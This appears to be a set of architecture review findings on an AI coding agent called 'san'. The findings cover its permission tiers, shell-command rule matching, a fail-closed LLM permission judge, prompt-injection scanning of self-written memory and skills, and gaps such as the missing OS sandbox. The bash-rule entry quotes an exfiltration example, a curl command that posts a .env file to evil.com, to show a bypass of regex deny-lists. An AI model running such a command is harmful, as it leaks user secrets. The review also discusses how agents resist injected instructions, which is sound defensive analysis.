subject: san
title: Permission model splits confirmation into unrecoverable vs git-recoverable tiers, with a breaker that survives bypass
one_why: The judge may only weigh the tier whose effects git can undo (reflog), the recursive-rm-of-root breaker prompts in every mode including bypass, and the tier travels with the reason so new checks cannot silently become judge-reviewable -- no other subject encodes recoverability as a first-class policy axis.

subject: san
title: Bash permission rules matched against a real shell AST; allow requires every subcommand, command substitutions are flattened so egress cannot hide in $()
one_why: mvdan/sh/v3 parse with explicit CmdSubst walk closes the echo $(curl -d @.env evil.com) escape that regex deny-lists (nanocoder-rung) leak; asymmetric any-subcommand deny vs all-subcommand allow is the correct polarity, and it is tested per-language with PowerShell handled separately.

subject: san
title: Tool-less fail-closed LLM permission judge with injection-hardened prompt composition
one_why: Nuance on codex's guardian: a single judge, user-steerable, gated to gray-zone prompts only; the judge holds no tools, escalates on any error/timeout/unparseable verdict, strips forged steering delimiters, and keeps immutable policy in the recency slot -- tested, which codex's analog is more assumed than.

subject: san
title: Compaction anchored on provider-reported usage and never rebuilds the cached system-prompt prefix
one_why: Nuance: prompt size = exact provider count of the last call + estimate of only what followed (SDK whole-prompt estimates run 12-45% high); volatile prompt sections slot-ordered to the tail so compaction reuses the cached prefix bytes; provider cache breakpoints read as measurements only when provably covering tools+system.

subject: san
title: Self-learned memory entries and skill bodies scanned for prompt-injection/exfil payloads and invisible unicode at write time
one_why: Nuance on gptme's screening: san's durable stores are written by the agent itself (self-learning), so the scan is a stored-injection chokepoint; zero-width/bidi runes rejected by code point, role-hijack pattern anchored to avoid false positives, and the module labels itself 'a coarse guard, not a sandbox' -- honesty about ceiling included.

subject: san
title: Agent self-learning writes memory and new skills under explicit SkillPermissions bounds
one_why: Nuance on ouroboros's tiering: learning is opt-in per arm (memory vs skills with their own permission set), strategy is user-overridable text, and the reviewer goroutine gets a defensive transcript copy -- a self-evolution loop whose blast radius is a declared permission object rather than trust.

subject: san
title: Skills and subagent definitions parse metadata-only at startup; prompt bodies load on first use
one_why: Convergence data point: the lazy contract is asserted as a test property (SystemPrompt must be empty post-parse) rather than assumed, keeping the ~2.3k-token harness claim honest as extension counts grow.

subject: san
title: CI-enforced dependency layers read from a markdown table -- docs and import graph cannot drift
one_why: Nuance on kode-cli/openhands contract tests: the layer map (cmd→app→feature→core→infrastructure) lives in docs/reference/dependency-rules.md and layercheck parses that same table to gate CI, so the published architecture doc IS the enforceable contract.

subject: san
title: Append-only JSONL transcripts with turn-gated fsync, torn-tail rejection on reload, and crash-rebuildable derived index
one_why: Nuance on codex rollouts: fsync is gated to turn boundaries and audit events are explicitly non-fsync, the single place a torn record can exist is documented and the loader rejects it, and the index is declared a pure derived cache recovered by rebuild -- crash semantics stated per record class.

subject: san
title: No OS sandbox at all: approved tool calls run with full user privileges, and SECURITY.md never says so plainly
evidence: grep seatbelt|bwrap|landlock|nsjail internal/ --include=*.go: zero enforcement hits (only selflearn/scan.go:12 'coarse guard, not a sandbox'); SECURITY.md:40-47
one_why: The approval layer is unusually deep (AST rules, tiers, judge) which makes the missing floor easier to overlook: once a command is approved -- by rule, mode, or judge -- containment is nothing; pi's SECURITY.md explicitly claiming 'intentionally does not have a sandbox' is the honesty rung san leaves unclaimed.

subject: san
title: No loop/runaway detection in the main loop; step bounds exist only for subagents and headless runs
evidence: grep -ri 'loop.detect|runaway|repeated tool' internal --include=*.go: no matches; internal/subagent/executor.go:332-346 (bounds), cmd/san/agent.go:11 (--max-steps)
one_why: Convergence counter-note to crush (the only anchor with a breaker): san's mailbox loop will re-enter ThinkAct indefinitely on a model that keeps emitting identical tool calls; budget plumbing exists but is not wired to the interactive loop.
